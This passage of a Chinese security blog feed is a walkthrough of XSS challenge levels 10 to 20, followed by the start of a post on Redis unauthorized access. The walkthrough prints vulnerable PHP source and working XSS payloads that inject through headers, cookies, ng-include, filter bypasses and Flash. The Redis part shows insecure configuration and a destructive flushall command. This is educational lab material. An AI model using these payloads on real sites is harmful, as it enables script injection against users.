class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>发现GET参数<code>t_sort</code>会被过滤<code>&lt;&gt;</code>输出，所以可以使用事件属性进行构造利用</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251116826.png" alt="1558251116826"></p><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><h3 id="Referer头插入"><a href="#Referer头插入" class="headerlink" title="Referer头插入"></a>Referer头插入</h3><p>隐藏表单多了一个<code>&lt;input&gt;</code></p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251262671.png" alt="1558251262671"></p><p>把全部表单的值通过GET参数传递过去</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251563250.png" alt="1558251563250"></p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251601685.png" alt="1558251601685"></p><p>只有t_sort接收了get传参，看起来双引号被转义掉了，尝试了单引号也不行，又尝试了POST传参也不行</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>和上一关的代码类似，但是<code>t_sort</code>的值经过了html实体化转义，所以无法在此处进行利用了。不过新的<code>t_ref</code>，的值是通过referer头获取的，可以抓包修改Referer头的内容，插入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558252521803.png" alt="1558252521803"></p><p>总结：</p><p>要注意细节，寻找提示信息，不放过任何一处我们提交的数据内容</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><h3 id="UA头插入"><a href="#UA头插入" class="headerlink" title="UA头插入"></a>UA头插入</h3><p>在页面源码中发现User-Agent信息</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558252884442.png" alt="1558252884442"></p><p>修改UA头部信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253045262.png" alt="1558253045262"></p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253074469.png" alt="1558253074469"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>跟上一关一样，区别就在于获取的请求头部信息变成了<code>User-Agent</code>，所以只需要抓包修改UA的内容即可</p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><h3 id="Cookie插入"><a href="#Cookie插入" class="headerlink" title="Cookie插入"></a>Cookie插入</h3><p>注意到cookie参数</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253383778.png" alt="1558253383778"></p><p>查看cookie内容</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253574394.png" alt="1558253574394"></p><p>修改cookie，插入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253654942.png" alt="1558253654942"></p><p>成功触发XSS</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>跟之前一样，区别就在于获取的请求头部信息换成了获取cookie中的<code>user</code>的值，所以把cookie中user的值里插入payload即可</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><h3 id="exif-xss"><a href="#exif-xss" class="headerlink" title="exif xss"></a>exif xss</h3><p>这关使用<code>&lt;iframe&gt;</code>嵌入了一个小网页（注意：需要访问到<code>外网</code>才能访问）</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558254716646.png" alt="1558254716646"></p><p>发现搜索框有输出点</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558254944255.png" alt="1558254944255"></p><p>尝试闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558255107617.png" alt="1558255107617"></p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558255149283.png" alt="1558255149283"></p><p>&lt;&gt;被转义掉了，感觉这里不存在可利用的点了。</p><p>看下源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只有一个iframe标签引用了<a href="http://exofvoewer.org/" target="_blank" rel="noopener">http://exofvoewer.org</a>，最后看了下<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">先知上的wp</a>，了解到这关考察的是exif xss，漏洞原理是通过修改图片的exif信息，造成解析图片exif触发XSS。</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558360067701.png" alt="1558360067701"></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; &quot;&gt;&lt;img src=x onerror=alert(1)&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558358694058.png" alt="1558358694058"></p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><h3 id="文件包含插入"><a href="#文件包含插入" class="headerlink" title="文件包含插入"></a>文件包含插入</h3><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558265228176.png" alt="1558265228176"></p><p>先试了一下闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558266783744.png" alt="1558266783744"></p><p><code>&lt;&gt;</code>被转义掉了，再试一下事件属性</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558266984431.png" alt="1558266984431"></p><p>双引号也被转义掉了，一时没了思路，看了下网上的文章，说是要注意下面这里</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558267117962.png" alt="1558267117962"></p><p>上网查了一下相关知识</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558265795045.png" alt="1558265795045"></p><p>发现ng-include可以利用，因为不能跨域，所以包含一个前面的关卡，<code>&lt;script&gt;</code>没有成功，使用<code>&lt;img&gt;</code>成功触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php?name=&lt;/h2&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;h2&gt;&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558266253831.png" alt="1558266253831"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>此处只有一个输出点，被实体化转义过了，也不是单引号闭合，所以无法逃逸，只能从<code>ng-include</code>处入手了。</p><p>还有一点疑问，我们的payload明明被实体化转义掉了，为什么还可以再原样输出回来呢？</p><p>总结：</p><p>发现不一样，不了解的点时，多去查查相关资料，不能错过知识点外的机会。</p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><h3 id="空格字符绕过"><a href="#空格字符绕过" class="headerlink" title="空格字符绕过"></a>空格字符绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558267796468.png" alt="1558267796468"></p><p>尝试<code>&lt;script&gt;</code>标签</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558268014317.png" alt="1558268014317"></p><p><code>script</code> 和 <code>/</code> 替换为空，试一下<code>svg</code></p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558268343632.png" alt="1558268343632">发现只有空格被过滤掉，使用<code>%0a</code> <code>%0d</code>做分隔符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0aonload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br><span class="line">?keyword=&lt;svg%0donload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558268510194.png" alt="1558268510194"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>只是对空格，<code>script</code>，<code>/</code> 进行了过滤，不使用<code>script</code>，并且用其他方式代替空格即可成功绕过。</p><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><h3 id="属性空格逃逸"><a href="#属性空格逃逸" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558273349908.png" alt="1558273349908"></p><p>可以看到可控的参数有两个，试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558273500807.png" alt="1558273500807"></p><p><code>&lt;&gt;</code>，<code>&quot;</code>被过滤，最后试出来个哈哈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558273987115.png" alt="1558273987115"></p><p>那这样应该也能行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558274123391.png" alt="1558274123391"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>虽然参数都加上了实体化转义，但是没有引号闭合属性，所以添加空格就可以写个新属性啦哈哈</p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><h3 id="属性空格逃逸-1"><a href="#属性空格逃逸-1" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p>Excuse me ???，上把的payload都没变</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558274541848.png" alt="1558274541848"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我瞅了半天，才发现只是引用的swf文件名不一样。。好吧，下一关</p><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这关试了怎么试都跳不出了属性的值</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558313314215.png" alt="1558313314215"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf03.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：这里和上两关</p><p>的区别就在于有了双引号来闭合属性的值，又因为使用了实体化转义的函数，双引号无法逃脱出去。所以这关考察的应该是Flash XSS，参考了<a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">D4rk3r</a>这位大佬的文章</p><p>使用工具<a href="https://github.com/jindrapetrik/jpexs-decompiler" target="_blank" rel="noopener">jpexs-decompiler</a></p><p>首先找到getURL函数</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558315194981.png" alt="1558315194981"></p><p>然后发现了version参数会被传入loc4变量中，即sIFR的内容中</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558315623256.png" alt="1558315623256"></p><p>但是根据第一张图中getURL只在内容为link时打开，所以再看下contentIsLink()函数</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558316052078.png" alt="1558316052078"></p><p>得知构造<code>&lt;a&gt;&lt;/a&gt;</code>标签来传值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558316206643.png" alt="1558316206643"></p><p>注意：我的火狐浏览器加载不出来flash，这里用的chrome可以加载</p><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><h3 id="Flash-XSS-1"><a href="#Flash-XSS-1" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这一关和上关一样，考察Flash XSS</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf04.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网上说是<strong>zeroclipboard.swf</strong> 的XSS，其主要的功能是复制内容到剪切板，中间由flash进行中转保证兼容主流浏览器，具体做法就是使这个透明的flash漂浮在复制按钮之上，下面给出xss poc代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id</span><br><span class="line">&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)//%26width%26height</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558343919410.png" alt="1558343919410"></p><p>看一下flash代码，看不懂了 (￣_￣|||)，就先记录一下payload吧。</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p><p><a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">XSS挑战之旅–游戏闯关</a></p><p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">【巨人肩膀上的矮子】XSS挑战之旅—游戏通关攻略（更新至18关）</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权访问漏洞</title>
      <link href="/2019/05/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Redis介绍"><a href="#一、Redis介绍" class="headerlink" title="一、Redis介绍"></a>一、Redis介绍</h2><p><code>Redis</code>是一个开源的，基于<code>ANSI C语言</code>开发、支持网络、可基于内存亦可持久化的日志型的高性能的Key-Value数据库系统</p><h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><p> Redis未授权访问漏洞即Redis匿名访问漏洞，是由于 <code>Redis</code>服务本身的特性及其运维不当造成的。</p><p><code>Redis</code>的默认配置文件中，会绑定 <code>0.0.0.0:6379</code>，这样 <code>Redis</code>会监听一切 <code>IP</code>，接收一切 <code>IP</code>的请求。如果没有采用添加防火墙规则等安全策略屏蔽非信任来源 <code>IP</code>访问，就会使 <code>Redis</code>服务暴露在公网，被任意用户进行登录。</p><p><code>Redis</code>默认没有设置密码认证，没有进行相应的密码验证会导致任意 用户免密登录 <code>Redis</code>，从而读取 <code>Redis</code>的数据、篡改 <code>Redis</code>的数据或者更高危的操作。</p><a id="more"></a><h2 id="二、Redis安装"><a href="#二、Redis安装" class="headerlink" title="二、Redis安装"></a>二、Redis安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get update</span><br><span class="line">$sudo apt-get install redis-server</span><br></pre></td></tr></table></figure><h2 id="二、Redis服务器配置"><a href="#二、Redis服务器配置" class="headerlink" title="二、Redis服务器配置"></a>二、Redis服务器配置</h2><p>修改配置文件 /opt/redis/redis.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># bind 127.0.0.1#监听任意ip</span><br><span class="line">protected-mode no#关闭保护模式</span><br></pre></td></tr></table></figure><p>启动redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf #重新加载配置文件</span><br></pre></td></tr></table></figure><h2 id="三、Redis客户端连接"><a href="#三、Redis客户端连接" class="headerlink" title="三、Redis客户端连接"></a>三、Redis客户端连接</h2><p>客户端（本地宿主机）连接redis服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure><h2 id="四、基础命令"><a href="#四、基础命令" class="headerlink" title="四、基础命令"></a>四、基础命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info#版本信息，服务器信息等</span><br><span class="line">set name &quot;hi&quot;#设置变量</span><br><span class="line">get name #取值</span><br><span class="line">flushall #删除数据库（一般情况下不要用！）</span><br><span class="line">keys * #查看所有的键</span><br><span class="line">CONFIG GET dir/dbfilename#获取默认的Reids目录和rdb的文件名，在修改前先获取，然后走的时候再恢复</span><br><span class="line">CONFIG SET 